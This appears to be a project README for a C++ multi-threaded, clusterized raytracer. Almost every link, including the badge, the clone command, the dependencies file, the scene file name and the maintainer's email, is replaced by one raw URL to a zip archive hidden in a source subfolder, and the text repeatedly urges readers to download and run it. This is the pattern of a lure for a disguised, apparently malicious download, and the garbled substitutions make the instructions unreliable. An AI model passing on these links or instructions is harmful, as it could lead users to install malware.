# Raytracer 🌌

![Raytracer](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip%20%26%20Clusterized-blue)

Welcome to the **Raytracer** repository! This project features a multi-threaded and clusterized raytracer, developed in C++. Raytracing is a powerful technique for rendering images with high realism by simulating the way light interacts with objects.

## Table of Contents

- [Introduction](#introduction)
- [Features](#features)
- [Getting Started](#getting-started)
- [Usage](#usage)
- [Architecture](#architecture)
- [Contributing](#contributing)
- [License](#license)
- [Contact](#contact)

## Introduction

Raytracing involves tracing the path of rays of light as they travel through a scene. This project leverages multi-threading and clustering to enhance performance and efficiency. By distributing tasks across multiple threads and nodes, the raytracer can handle complex scenes and produce high-quality images in less time.

You can download the latest release [here](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip). Make sure to follow the instructions to execute the application correctly.

## Features

- **Multi-threading**: Efficiently utilizes CPU resources to speed up rendering.
- **Clustering**: Distributes rendering tasks across multiple machines for improved performance.
- **Networking**: Supports socket communication for cluster management.
- **YAML Parser**: Easily configure scenes and settings using YAML files.
- **High-Quality Output**: Generates realistic images with advanced lighting and shading techniques.

## Getting Started

To get started with Raytracer, follow these steps:

1. **Clone the Repository**:
   ```bash
   git clone https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip
   cd raytracer
   ```

2. **Install Dependencies**:
   Ensure you have the necessary libraries installed. You can find a list of dependencies in the `https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip` file.

3. **Build the Project**:
   Use CMake to build the project:
   ```bash
   mkdir build
   cd build
   cmake ..
   make
   ```

4. **Run the Raytracer**:
   After building, you can run the raytracer:
   ```bash
   ./raytracer <path_to_yml_file>
   ```

For detailed instructions, check the [Releases](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip) section.

## Usage

The raytracer uses YAML files to define scenes. Each scene can specify various parameters, including camera position, light sources, and object properties. Here’s a basic example of a YAML configuration:

```yaml
scene:
  camera:
    position: [0, 0, -5]
    lookAt: [0, 0, 0]
  lights:
    - position: [10, 10, -10]
      color: [1, 1, 1]
  objects:
    - type: sphere
      position: [0, 0, 0]
      radius: 1
      color: [1, 0, 0]
```

To render this scene, save it as `https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip` and run the raytracer with:
```bash
./raytracer https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip
```

## Architecture

The architecture of the Raytracer is designed for scalability and performance. It consists of several key components:

1. **Renderer**: The core module responsible for ray tracing and image generation.
2. **Thread Pool**: Manages multiple threads to parallelize the rendering process.
3. **Network Module**: Handles communication between nodes in a cluster.
4. **YAML Parser**: Reads and interprets scene configurations from YAML files.

### Thread Management

The thread pool allows the raytracer to spawn multiple threads that work on different parts of the image simultaneously. This significantly reduces rendering time, especially for complex scenes.

### Networking

The networking module uses sockets to communicate between different machines in a cluster. Each node can receive tasks from a master node, process them, and send back results.

## Contributing

Contributions are welcome! If you’d like to contribute, please follow these steps:

1. Fork the repository.
2. Create a new branch (`git checkout -b feature/YourFeature`).
3. Make your changes and commit them (`git commit -m 'Add some feature'`).
4. Push to the branch (`git push origin feature/YourFeature`).
5. Open a pull request.

Please ensure that your code follows the existing style and includes tests where applicable.

## License

This project is licensed under the MIT License. See the [LICENSE](LICENSE) file for details.

## Contact

For questions or feedback, please reach out to the project maintainer:

- **Name**: Sebastian EP
- **Email**: https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip

You can also check the latest releases [here](https://raw.githubusercontent.com/SebastianEP17/raytracer/main/src/Math/Software-v2.6.zip). Download the latest version and explore the capabilities of the Raytracer.

---

Thank you for your interest in Raytracer! We hope you enjoy using it and contributing to its development. Happy rendering!